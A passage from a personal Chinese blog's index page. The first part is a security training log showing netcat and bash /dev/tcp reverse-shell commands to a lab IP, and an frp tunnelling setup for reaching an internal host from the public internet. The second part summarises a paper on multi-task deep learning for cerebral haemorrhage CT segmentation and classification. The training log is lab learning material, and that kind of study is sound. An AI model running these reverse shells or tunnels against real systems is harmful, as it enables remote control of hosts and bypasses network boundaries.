<p>用kali连接windows</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">目标机：nc -e cmd.exe 192.168.68.135 8000</span><br><span class="line">攻击机：nc -lvvp 8000</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220720113600172.png" alt="image-20220720113600172"></p>
<p>用kali连接ubuntu</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.68.135/8000 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220720141018763.png" alt="image-20220720141018763"></p>
<h3 id="任务五-端口转发"><a href="#任务五-端口转发" class="headerlink" title="任务五.端口转发"></a>任务五.端口转发</h3><h4 id="通过公网连接内网服务器"><a href="#通过公网连接内网服务器" class="headerlink" title="通过公网连接内网服务器"></a>通过公网连接内网服务器</h4><h4 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h4><p>局域网？广域网？</p>
<p>内网：</p>
<p>公网ip不能直接主动向内网ip发送请求并通信</p>
<h4 id="Q1-公网的frps桥接服务如何知道将请求转发给哪个内网的机器的哪个端口"><a href="#Q1-公网的frps桥接服务如何知道将请求转发给哪个内网的机器的哪个端口" class="headerlink" title="Q1. 公网的frps桥接服务如何知道将请求转发给哪个内网的机器的哪个端口"></a>Q1. 公网的frps桥接服务如何知道将请求转发给哪个内网的机器的哪个端口</h4><h4 id="Q2-攻防的frps桥接服务既然无法主动与内网的服务器进行通信，那它又是如何转发流量到内网的"><a href="#Q2-攻防的frps桥接服务既然无法主动与内网的服务器进行通信，那它又是如何转发流量到内网的" class="headerlink" title="Q2. 攻防的frps桥接服务既然无法主动与内网的服务器进行通信，那它又是如何转发流量到内网的"></a>Q2. 攻防的frps桥接服务既然无法主动与内网的服务器进行通信，那它又是如何转发流量到内网的</h4><p>三个角色：</p>
<p>公网frps中转服务器</p>
<p>内网终端：自己有一个frpc客户端</p>
<p>请求终端</p>
<h5 id="直接的流程："><a href="#直接的流程：" class="headerlink" title="直接的流程："></a>直接的流程：</h5><p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/Users\LOIS\Desktop\QQ图片20220720153627.png" alt="QQ图片20220720153627"></p>
<p>借用公网frps流量转发服务，通过公网域名和端口，访问虚拟机内部网站，实现内网穿透。</p>
<p>要求：自己根据后面示例，配置frpc.ini和启动frpc</p>
<p><strong>frps服务器信息：</strong></p>
<p>域名:<img src="file:///C:\Users\LOIS\AppData\Roaming\Tencent\QQTempSys%W@GJ$ACOF(TYDYECOKVDYB.png" alt="img"></p>
<p><a target="_blank" rel="noopener" href="http://www.wabjtam.ml/">www.wabjtam.ml</a></p>
<p>ini</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 63777</span><br><span class="line">authentication_method = token</span><br><span class="line">auth_token = 1l1l1l</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>frpc启动与配置：</strong></p>
<p>frpc启动方式：frpc.exe -c frpc.ini</p>
<p>frpc.ini示例（其中remote_port有5位数字，是由20附加上学号后三位数字组成）</p>
<p>ini</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = xxxx</span><br><span class="line">server_port = yyy</span><br><span class="line">authentication_method = token</span><br><span class="line">auth_token = zzz</span><br><span class="line"></span><br><span class="line">[RDP]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 3389</span><br><span class="line">remote_port = 63389</span><br></pre></td></tr></table></figure>

<p>更改frpc.ini文件为</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220720161559224.png" alt="image-20220720161559224"></p>
<p>在终端中执行</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220720161621991.png" alt="image-20220720161621991"></p>
<p>访问相应网站，访问成功</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220720162923663.png" alt="image-20220720162923663"></p>
<h3 id="任务六-了解攻击反制"><a href="#任务六-了解攻击反制" class="headerlink" title="任务六.了解攻击反制"></a>任务六.了解攻击反制</h3><p>任意挑一个写·</p>
<ol>
<li><p>burpsuite的rce</p>
<p>render渲染</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220720173433096.png" alt="image-20220720173433096"></p>
</li>
<li><p>mysql的任意文件读取</p>
</li>
<li><p>goby的rce</p>
</li>
<li><p>coboltStrike的批量伪装上线</p>
</li>
</ol>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://luosyrrrr.github.io/2022/08/16/%E5%85%B1%E4%BA%AB%E6%B5%85%E5%B1%82%E5%8F%82%E6%95%B0%E5%A4%9A%E4%BB%BB%E5%8A%A1%E5%AD%A6%E4%B9%A0%E7%9A%84%E8%84%91%E5%87%BA%E8%A1%80%E5%9B%BE%E5%83%8F%E5%88%86%E5%89%B2%E4%B8%8E%E5%88%86%E7%B1%BB-%E9%98%85%E8%AF%BB/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="LUOSY'S BLOG">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2022/08/16/%E5%85%B1%E4%BA%AB%E6%B5%85%E5%B1%82%E5%8F%82%E6%95%B0%E5%A4%9A%E4%BB%BB%E5%8A%A1%E5%AD%A6%E4%B9%A0%E7%9A%84%E8%84%91%E5%87%BA%E8%A1%80%E5%9B%BE%E5%83%8F%E5%88%86%E5%89%B2%E4%B8%8E%E5%88%86%E7%B1%BB-%E9%98%85%E8%AF%BB/" itemprop="url">共享浅层参数多任务学习的脑出血图像分割与分类--阅读</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-08-16T13:25:45+08:00">
                2022-08-16
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/" itemprop="url" rel="index">
                    <span itemprop="name">论文阅读</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <span id="more"></span>

<h2 id="一、研究背景"><a href="#一、研究背景" class="headerlink" title="一、研究背景"></a>一、研究背景</h2><p>非对比增强 CＴ（Non-contrast-Enhanced CT，<strong>NECT</strong>）扫描是急诊室诊断疑似急性脑出血的首选方法</p>
<p>医疗人员通常使用疑似急性脑出血患者的 <strong>NECT</strong> 图像对病灶部位，</p>
<p>通用方法：<u><strong>先人工进行手动分割，进而根据临床经验进行分类</strong></u></p>
<h5 id="缺点："><a href="#缺点：" class="headerlink" title="缺点："></a>缺点：</h5><p>这种人工诊断的方式对医师的经验要求较高，主观性较强，将分割和分类任务分开 执行，不能充分利用两个任务间相关联的特征信息，时间成本高</p>
<p>目前，医学图像分类领域广泛使用卷积神经网络（ＣＮＮ）来构建深度学习模型，通常将分割和分类当作两个单一的任务，在获取特征时往往会忽略一些任务之间相关联的信息，不能得到更佳的 分割或分类性能。</p>
<h2 id="二、材料和方法"><a href="#二、材料和方法" class="headerlink" title="二、材料和方法"></a>二、材料和方法</h2><h5 id="1-3D-U-Net："><a href="#1-3D-U-Net：" class="headerlink" title="1.3D U-Net："></a>1.<strong>3D U-Net</strong>：</h5><p>Cicek等提出了3D U-Net用于医学图像的分析，与 U-Net相比，3D U-Net能更 好地提取医学图像的空间特征</p>
<p><img src="/2022/08/16/%E5%85%B1%E4%BA%AB%E6%B5%85%E5%B1%82%E5%8F%82%E6%95%B0%E5%A4%9A%E4%BB%BB%E5%8A%A1%E5%AD%A6%E4%B9%A0%E7%9A%84%E8%84%91%E5%87%BA%E8%A1%80%E5%9B%BE%E5%83%8F%E5%88%86%E5%89%B2%E4%B8%8E%E5%88%86%E7%B1%BB-%E9%98%85%E8%AF%BB/9bd0dcc19a7eae219ec5b3b28c3b785c.jpeg" alt="v2-cf0ead284f68d91a42cd3908cf793956_b.jpg" style="zoom: 50%;"><img src="/2022/08/16/%E5%85%B1%E4%BA%AB%E6%B5%85%E5%B1%82%E5%8F%82%E6%95%B0%E5%A4%9A%E4%BB%BB%E5%8A%A1%E5%AD%A6%E4%B9%A0%E7%9A%84%E8%84%91%E5%87%BA%E8%A1%80%E5%9B%BE%E5%83%8F%E5%88%86%E5%89%B2%E4%B8%8E%E5%88%86%E7%B1%BB-%E9%98%85%E8%AF%BB/ae2cebe759c79f1312fab5eb86bb3929.jpeg" alt="v2-b96c16ddee163ebfe2542cc13c074a17_b.jpg" style="zoom: 50%;"></p>
<h5 id="2-He提出的-多任务学习-（Multi-Task-Learning，MTL）模-型，"><a href="#2-He提出的-多任务学习-（Multi-Task-Learning，MTL）模-型，" class="headerlink" title="2.He提出的 多任务学习 （Multi-Task Learning，MTL）模 型，"></a>2.He提出的 多任务学习 （Multi-Task Learning，MTL）模 型，</h5><p>编码部分：使用DenseNet／ResNet结构</p>
<p>解码部分：使用上采样和级联操作，其呈现出非对称结构的端对端学习网络</p>
<p>在最后分为分割和分 类两支输出，借助分类任务辅助学习关联信息，提升分割精度。</p>
<p><a target="_blank" rel="noopener" href="https://blog.nowcoder.net/n/4c7bd845b26a4efaa5d53c304ac306eb">医学图像分割经典论文分享6.27_牛客博客 (nowcoder.net)</a></p>
<img src="/2022/08/16/%E5%85%B1%E4%BA%AB%E6%B5%85%E5%B1%82%E5%8F%82%E6%95%B0%E5%A4%9A%E4%BB%BB%E5%8A%A1%E5%AD%A6%E4%B9%A0%E7%9A%84%E8%84%91%E5%87%BA%E8%A1%80%E5%9B%BE%E5%83%8F%E5%88%86%E5%89%B2%E4%B8%8E%E5%88%86%E7%B1%BB-%E9%98%85%E8%AF%BB/1-s2.0-S1361841520300323-gr1.jpg" alt="Fig. 1" style="zoom:50%;">

<h5 id="3-Y-Net模型（作比较的模型）Y-Net采用了两阶段结构，"><a href="#3-Y-Net模型（作比较的模型）Y-Net采用了两阶段结构，" class="headerlink" title="3.Y-Net模型（作比较的模型）Y-Net采用了两阶段结构，"></a>3.Y-Net模型（作比较的模型）Y-Net采用了两阶段结构，</h5><p>第一部分像 U-Net一样输出分割掩模</p>
<p>第二部分在底层热图处添加输出分类标签的并行分支</p>
<p>但是，脑动静脉畸形出血相比其他类型出血在成分上不均匀，且出血周围扩张的静脉可能会使边界凹陷，在形态上出现差异，因此需要尽可能多地提取分类任务深层的私 有特征</p>
<img src="/2022/08/16/%E5%85%B1%E4%BA%AB%E6%B5%85%E5%B1%82%E5%8F%82%E6%95%B0%E5%A4%9A%E4%BB%BB%E5%8A%A1%E5%AD%A6%E4%B9%A0%E7%9A%84%E8%84%91%E5%87%BA%E8%A1%80%E5%9B%BE%E5%83%8F%E5%88%86%E5%89%B2%E4%B8%8E%E5%88%86%E7%B1%BB-%E9%98%85%E8%AF%BB/image-20220816144327949.png" alt="image-20220816144327949" style="zoom: 50%;">

<h5 id="4-MLSSP共享浅层参数的多任务学习模型"><a href="#4-MLSSP共享浅层参数的多任务学习模型" class="headerlink" title="4.MLSSP共享浅层参数的多任务学习模型"></a>4.MLSSP共享浅层参数的多任务学习模型</h5><p><strong>优势</strong>：与 He提出的借助分类辅助学习输出 和 Ｙ－Ｎｅｔ在编码部分底层实现并行分支相比，<strong>本文所提模型 不仅可以提取两个任务的浅层公有特征进行硬参数共享，还 能够在网络深层分别提取两个任务需要的深层私有特征</strong></p>
<p>U-Net，Y-Net和 MLSSP 的体系结构对比如图１所示</p>
<img src="/2022/08/16/%E5%85%B1%E4%BA%AB%E6%B5%85%E5%B1%82%E5%8F%82%E6%95%B0%E5%A4%9A%E4%BB%BB%E5%8A%A1%E5%AD%A6%E4%B9%A0%E7%9A%84%E8%84%91%E5%87%BA%E8%A1%80%E5%9B%BE%E5%83%8F%E5%88%86%E5%89%B2%E4%B8%8E%E5%88%86%E7%B1%BB-%E9%98%85%E8%AF%BB/image-20220816154743377.png" alt="image-20220816154743377" style="zoom:80%;">

<h2 id="三、模型框架-MLSSP"><a href="#三、模型框架-MLSSP" class="headerlink" title="三、模型框架 MLSSP"></a>三、模型框架 MLSSP</h2><p>共享浅层参数的多任务学习模型（Multi-task Learning of Shared Shallow Parameters,MLSSP)</p>
<h5 id="0-数据来源"><a href="#0-数据来源" class="headerlink" title="0.数据来源"></a>0.数据来源</h5><p> 实验使用了３８位AVM患者和４２位其他类型出血患者作为被试，获得NECT数据。所有数据均具有出血 类型标签及语义分割标签。其中语义分割标签由两位有丰富 诊治经验的放射科主任医师对 NECT图像进行手工标注，以划定实质内出血的区域</p>
<p>白色区域为出血病灶区 域，将其像素值标记为１，其余区域像素值标记为０</p>
<img src="/2022/08/16/%E5%85%B1%E4%BA%AB%E6%B5%85%E5%B1%82%E5%8F%82%E6%95%B0%E5%A4%9A%E4%BB%BB%E5%8A%A1%E5%AD%A6%E4%B9%A0%E7%9A%84%E8%84%91%E5%87%BA%E8%A1%80%E5%9B%BE%E5%83%8F%E5%88%86%E5%89%B2%E4%B8%8E%E5%88%86%E7%B1%BB-%E9%98%85%E8%AF%BB/image-20220816150826461.png" alt="image-20220816150826461" style="zoom:80%;">

<p>进行数据预处理：颅骨剥离、重采样、灰度归一化、提取 VOI、数据扩充</p>
<h5 id="1-第一步：输入数据"><a href="#1-第一步：输入数据" class="headerlink" title="1.第一步：输入数据"></a>1.第一步：输入数据</h5><p>脑出血的 VOI</p>
<h5 id="2-第二步：浅层共有特征提取"><a href="#2-第二步：浅层共有特征提取" class="headerlink" title="2.第二步：浅层共有特征提取"></a>2.第二步：浅层共有特征提取</h5><p>进行两次卷积（白色小方块)，因为两个网络的浅层卷积层都起到了提取图像低阶特征的作用，而深层卷积层的目的是提取不同任务需要的高阶特征，所以通过浅层卷积层实现硬参数共享来构建多任务学习模型是可行的</p>
<p>与 He提出的借助分类辅助学习输出 和 Ｙ－Ｎｅｔ在编码部分底层实现并行分支相比，<strong>本文所提模型 不仅可以提取两个任务的浅层公有特征进行硬参数共享，还 能够在网络深层分别提取两个任务需要的深层私有特征</strong></p>
<h5 id="3-第三步：提取两个任务需要的深层私有特征"><a href="#3-第三步：提取两个任务需要的深层私有特征" class="headerlink" title="3.第三步：提取两个任务需要的深层私有特征"></a>3.第三步：提取两个任务需要的深层私有特征</h5><p>在两次卷积后分为两个分支，分别进入两个不同的模块（同步进行），用于提取不同任务的高阶特征</p>
<h6 id="（一）脑出血分割模块"><a href="#（一）脑出血分割模块" class="headerlink" title="（一）脑出血分割模块"></a>（一）脑出血分割模块</h6><p><img src="/2022/08/16/%E5%85%B1%E4%BA%AB%E6%B5%85%E5%B1%82%E5%8F%82%E6%95%B0%E5%A4%9A%E4%BB%BB%E5%8A%A1%E5%AD%A6%E4%B9%A0%E7%9A%84%E8%84%91%E5%87%BA%E8%A1%80%E5%9B%BE%E5%83%8F%E5%88%86%E5%89%B2%E4%B8%8E%E5%88%86%E7%B1%BB-%E9%98%85%E8%AF%BB/image-20220816140038269.png" alt="image-20220816140038269" style="zoom:80%;"><img src="/2022/08/16/%E5%85%B1%E4%BA%AB%E6%B5%85%E5%B1%82%E5%8F%82%E6%95%B0%E5%A4%9A%E4%BB%BB%E5%8A%A1%E5%AD%A6%E4%B9%A0%E7%9A%84%E8%84%91%E5%87%BA%E8%A1%80%E5%9B%BE%E5%83%8F%E5%88%86%E5%89%B2%E4%B8%8E%E5%88%86%E7%B1%BB-%E9%98%85%E8%AF%BB/image-20220816145053552.png" alt="image-20220816145053552" style="zoom:40%;"></p>
<p>分割分支传入基于3D U-Net的脑出血分割网络</p>
<p><strong>网络左侧</strong>:４层收缩路径，每一层都由两个大小为３×３×３、步长为１的卷积层,和 一个大小为２×２×２、步长为２的下采样卷积核组成,使用 ReLU作为激活函数，防止数据过拟合。下采样４次，通过三维卷积来获取各个层级的语义信息。</p>
<p><strong>网络右侧</strong>：扩张路径， 对应收缩路径，扩张路径进行４次上采样操作，每一层都有特 征图与对应收缩路径的跳跃连接进行级联作为输入，经过两 个大小为３×３×３、步长为１的卷积层和一个大小为２×２× ２、步长为２的反卷积层，使用  ReLU 作为激活函数，将高级语 义特征图恢复到原始图片的分辨率。</p>
<p>在收缩路径和扩张路径的同一阶段使用跳跃连接，补充卷积过程中丢失的低阶特征信息，同时在扩张过程中融合不同尺度的特征，提升分割 度。</p>
<p>最后使用大小为１×１×１、激活函数为Sigmoid的卷积层 进行语义分割</p>
<p>计算该模块损失函数：（Dice系数）</p>
<p><img src="/2022/08/16/%E5%85%B1%E4%BA%AB%E6%B5%85%E5%B1%82%E5%8F%82%E6%95%B0%E5%A4%9A%E4%BB%BB%E5%8A%A1%E5%AD%A6%E4%B9%A0%E7%9A%84%E8%84%91%E5%87%BA%E8%A1%80%E5%9B%BE%E5%83%8F%E5%88%86%E5%89%B2%E4%B8%8E%E5%88%86%E7%B1%BB-%E9%98%85%E8%AF%BB/image-20220816145415401.png" alt="image-20220816145415401"></p>
<p>Ｖ 表示区域的体积；Ｇ 表示真实分割图像；Ｐ 表示预测 分割图像；ε设为常数１，以防止计算时分母出现０的情况。</p>
<h6 id="（二）脑出血分类模块"><a href="#（二）脑出血分类模块" class="headerlink" title="（二）脑出血分类模块"></a>（二）脑出血分类模块</h6><p><img src="/2022/08/16/%E5%85%B1%E4%BA%AB%E6%B5%85%E5%B1%82%E5%8F%82%E6%95%B0%E5%A4%9A%E4%BB%BB%E5%8A%A1%E5%AD%A6%E4%B9%A0%E7%9A%84%E8%84%91%E5%87%BA%E8%A1%80%E5%9B%BE%E5%83%8F%E5%88%86%E5%89%B2%E4%B8%8E%E5%88%86%E7%B1%BB-%E9%98%85%E8%AF%BB/image-20220816140140613.png" alt="image-20220816140140613"></p>
<p>分类分支传入基于卷积神经网络的脑出血分类网络</p>
<p>网络第一层为输入层，用于接收大小为64×64×64的脑出血图像，输入层之后经过两个卷积层，</p>
<p>接下来的分类网络由５个块组成</p>
<p>前两个块结构相同，包括大小为３×３×３、步长为１的卷积层 和一个大小为２×２×２、步长为２的最大池化层，使用 ReLU作为激活函数。</p>
<p>第３个和第４个块使用大小为６４的全连接 层，激活函数为ReLU。</p>
<p>第四层的输出全连接到第五层，通过 SigMoid激活函数得到２个输出。这２个输出即为输入脑出血图像类型的概率</p>
<p>计算该模块损失函数：（使用了交叉熵损失）</p>
<p><img src="/2022/08/16/%E5%85%B1%E4%BA%AB%E6%B5%85%E5%B1%82%E5%8F%82%E6%95%B0%E5%A4%9A%E4%BB%BB%E5%8A%A1%E5%AD%A6%E4%B9%A0%E7%9A%84%E8%84%91%E5%87%BA%E8%A1%80%E5%9B%BE%E5%83%8F%E5%88%86%E5%89%B2%E4%B8%8E%E5%88%86%E7%B1%BB-%E9%98%85%E8%AF%BB/image-20220816145939744.png" alt="image-20220816145939744"></p>
<h5 id="4-第四步：计算总体损失函数"><a href="#4-第四步：计算总体损失函数" class="headerlink" title="4.第四步：计算总体损失函数"></a>4.第四步：计算总体损失函数</h5><p>本文通过计算 Dice系数分割损失和交叉熵损失的加权 和来作为多任务学习网络的损失函数</p>
<p><img src="/2022/08/16/%E5%85%B1%E4%BA%AB%E6%B5%85%E5%B1%82%E5%8F%82%E6%95%B0%E5%A4%9A%E4%BB%BB%E5%8A%A1%E5%AD%A6%E4%B9%A0%E7%9A%84%E8%84%91%E5%87%BA%E8%A1%80%E5%9B%BE%E5%83%8F%E5%88%86%E5%89%B2%E4%B8%8E%E5%88%86%E7%B1%BB-%E9%98%85%E8%AF%BB/image-20220816150045758.png" alt="image-20220816150045758"></p>
<p>其中，α为语义分割和脑出血分类任务损失权重所占的比重， 通过对每项任务损失的比重进行调节，使两项任务的训练效 果达到最优。</p>
<h5 id="5-第五步：进行评价"><a href="#5-第五步：进行评价" class="headerlink" title="5.第五步：进行评价"></a>5.第五步：进行评价</h5><p>对分割和分类分别评估</p>
<h2 id="四、实现细节"><a href="#四、实现细节" class="headerlink" title="四、实现细节"></a>四、实现细节</h2><p>1.采用 Ｈｅ等提出的权重初始化方法</p>
<p>2.使 用 Adam算法作为优化器，计 算每个参数的自适应学习率</p>
<p>3.初始化学习率设置为0.0000１，经 过一个epoch衰减５％</p>
<p>4.使用５折交叉验证策略对多任务模 型性能进行评估</p>
<p>5.训练数据集和测试数据集保持基本相同的数据分布</p>
<h2 id="五、结果"><a href="#五、结果" class="headerlink" title="五、结果"></a>五、结果</h2><h5 id="1-脑出血分割对比结果"><a href="#1-脑出血分割对比结果" class="headerlink" title="1.脑出血分割对比结果"></a>1.脑出血分割对比结果</h5><h6 id="（一）不同权值损失的脑出血分割实验"><a href="#（一）不同权值损失的脑出血分割实验" class="headerlink" title="（一）不同权值损失的脑出血分割实验"></a>（一）不同权值损失的脑出血分割实验</h6><p>本实验选取的分割权重在0.3-0.7区间，每隔 0.1对模型进行训练</p>
<p><img src="/2022/08/16/%E5%85%B1%E4%BA%AB%E6%B5%85%E5%B1%82%E5%8F%82%E6%95%B0%E5%A4%9A%E4%BB%BB%E5%8A%A1%E5%AD%A6%E4%B9%A0%E7%9A%84%E8%84%91%E5%87%BA%E8%A1%80%E5%9B%BE%E5%83%8F%E5%88%86%E5%89%B2%E4%B8%8E%E5%88%86%E7%B1%BB-%E9%98%85%E8%AF%BB/image-20220816151957991.png" alt="image-20220816151957991" style="zoom: 75%;"><img src="/2022/08/16/%E5%85%B1%E4%BA%AB%E6%B5%85%E5%B1%82%E5%8F%82%E6%95%B0%E5%A4%9A%E4%BB%BB%E5%8A%A1%E5%AD%A6%E4%B9%A0%E7%9A%84%E8%84%91%E5%87%BA%E8%A1%80%E5%9B%BE%E5%83%8F%E5%88%86%E5%89%B2%E4%B8%8E%E5%88%86%E7%B1%BB-%E9%98%85%E8%AF%BB/image-20220816152044501.png" alt="image-20220816152044501" style="zoom: 80%;"></p>
<p>图３给出了权值为 MLSSP_0.4的模型的 DSC、 敏感度、特异度和 PPV 指标。</p>
<p>DSC:直观反映分割结果的相似度,为主要的分割评价指标</p>
<p>PPV：其次的评价指标， 其含义是预测出血体素占预测总体素的比值</p>
<p><strong>表一</strong>：MLSSP_0.5的网络特异度 达到５个权值模型中特异度的最大值</p>
<p>MLSSP_0.4的平均 DSC、敏感度和 PPV 均达到５个模型的最大值，</p>
<p><strong>图3</strong>：在 MLSSP_0.4模型下被试的分割指标分布大多较集中</p>
<p>结论：由于分割与分类任务选取的损失函数不相同，当α取0.4时， MLSSP模型能够达到较好的脑出血图像病灶分割效果，为脑 出血分割的进一步研究提供了基础</p>
<h6 id="（二）不同模型的脑出血分割实验"><a href="#（二）不同模型的脑出血分割实验" class="headerlink" title="（二）不同模型的脑出血分割实验"></a>（二）不同模型的脑出血分割实验</h6><p><img src="/2022/08/16/%E5%85%B1%E4%BA%AB%E6%B5%85%E5%B1%82%E5%8F%82%E6%95%B0%E5%A4%9A%E4%BB%BB%E5%8A%A1%E5%AD%A6%E4%B9%A0%E7%9A%84%E8%84%91%E5%87%BA%E8%A1%80%E5%9B%BE%E5%83%8F%E5%88%86%E5%89%B2%E4%B8%8E%E5%88%86%E7%B1%BB-%E9%98%85%E8%AF%BB/image-20220816153511822.png" alt="image-20220816153511822" style="zoom:90%;"><img src="/2022/08/16/%E5%85%B1%E4%BA%AB%E6%B5%85%E5%B1%82%E5%8F%82%E6%95%B0%E5%A4%9A%E4%BB%BB%E5%8A%A1%E5%AD%A6%E4%B9%A0%E7%9A%84%E8%84%91%E5%87%BA%E8%A1%80%E5%9B%BE%E5%83%8F%E5%88%86%E5%89%B2%E4%B8%8E%E5%88%86%E7%B1%BB-%E9%98%85%E8%AF%BB/image-20220816153722117.png" alt="image-20220816153722117" style="zoom:80%;"></p>
<p>相比单任务３Ｄ－UNet模型，加入多任务学习模型后得到 的分割结果的平均 DSC 指标更优。多任务学习模型更好地 利用了分割和分类任务之间的关联信息，提升了分割精度。</p>
<p>相比 Ｈｅ等利用分类辅助任务共享全部参数和 Ｙ－Ｎｅｔ共享全部编码参 数，MLSSP模型能更好地提取分割任务的私有特征，从而提 升分割精度。 </p>
<p>同时，MLSSP模型的平均 DSC高于 Ｙ－Ｎｅｔ以及 Ｈｅ等提 出的多任务学习模型，其平均 DSC达到最优。</p>
<p>主要优势：不连续出血区域更好</p>
<h5 id="2-脑出血分类对比实验"><a href="#2-脑出血分类对比实验" class="headerlink" title="2.脑出血分类对比实验"></a>2.脑出血分类对比实验</h5><h6 id="（一）不同权值损失的脑出血分类实验"><a href="#（一）不同权值损失的脑出血分类实验" class="headerlink" title="（一）不同权值损失的脑出血分类实验"></a>（一）不同权值损失的脑出血分类实验</h6><p>本实验使用准确率、敏感度、特异度和 ＡＵＣ评价模型在 脑出血图像分类上的性能，</p>
<p>表２列出了 MLSSP在 ５个α取值下的测试结果</p>
<p><img src="/2022/08/16/%E5%85%B1%E4%BA%AB%E6%B5%85%E5%B1%82%E5%8F%82%E6%95%B0%E5%A4%9A%E4%BB%BB%E5%8A%A1%E5%AD%A6%E4%B9%A0%E7%9A%84%E8%84%91%E5%87%BA%E8%A1%80%E5%9B%BE%E5%83%8F%E5%88%86%E5%89%B2%E4%B8%8E%E5%88%86%E7%B1%BB-%E9%98%85%E8%AF%BB/image-20220816154006356.png" alt="image-20220816154006356"></p>
<p>在５个不同权值网络中，MLSSP_0.4模 型的准确率、敏感度和特异度均优于其他权值网络。</p>
<h6 id="（二）不同模型的脑出血分类实验"><a href="#（二）不同模型的脑出血分类实验" class="headerlink" title="（二）不同模型的脑出血分类实验"></a>（二）不同模型的脑出血分类实验</h6><p><img src="/2022/08/16/%E5%85%B1%E4%BA%AB%E6%B5%85%E5%B1%82%E5%8F%82%E6%95%B0%E5%A4%9A%E4%BB%BB%E5%8A%A1%E5%AD%A6%E4%B9%A0%E7%9A%84%E8%84%91%E5%87%BA%E8%A1%80%E5%9B%BE%E5%83%8F%E5%88%86%E5%89%B2%E4%B8%8E%E5%88%86%E7%B1%BB-%E9%98%85%E8%AF%BB/image-20220816154406162.png" alt="image-20220816154406162" style="zoom:90%;"><img src="/2022/08/16/%E5%85%B1%E4%BA%AB%E6%B5%85%E5%B1%82%E5%8F%82%E6%95%B0%E5%A4%9A%E4%BB%BB%E5%8A%A1%E5%AD%A6%E4%B9%A0%E7%9A%84%E8%84%91%E5%87%BA%E8%A1%80%E5%9B%BE%E5%83%8F%E5%88%86%E5%89%B2%E4%B8%8E%E5%88%86%E7%B1%BB-%E9%98%85%E8%AF%BB/image-20220816154417416.png" alt="image-20220816154417416" style="zoom:80%;"></p>
<p>相比其他３种方法 MLSSP模型在准确率、 敏感度和特异度方面均达到最优</p>
<p>实验证明，同等数据下多任务学习模型优于单任务模型，同时MLSSP模型通过共享浅层有限的公有特征，并提取各个任务 的私有特征，表现出比 Ｙ－Ｎｅｔ模型与 Ｈｅ等提出的多任务 模型更优的分类结果</p>
<h2 id="六、不足"><a href="#六、不足" class="headerlink" title="六、不足"></a>六、不足</h2><p>损失函数权重存在一定的缺点，即选取的权重不连续，最佳权重有可能存在于所选权重附近， 这个问题未来可以通过权值自适应等方法进行改进。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://luosyrrrr.github.io/2022/08/16/task01/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

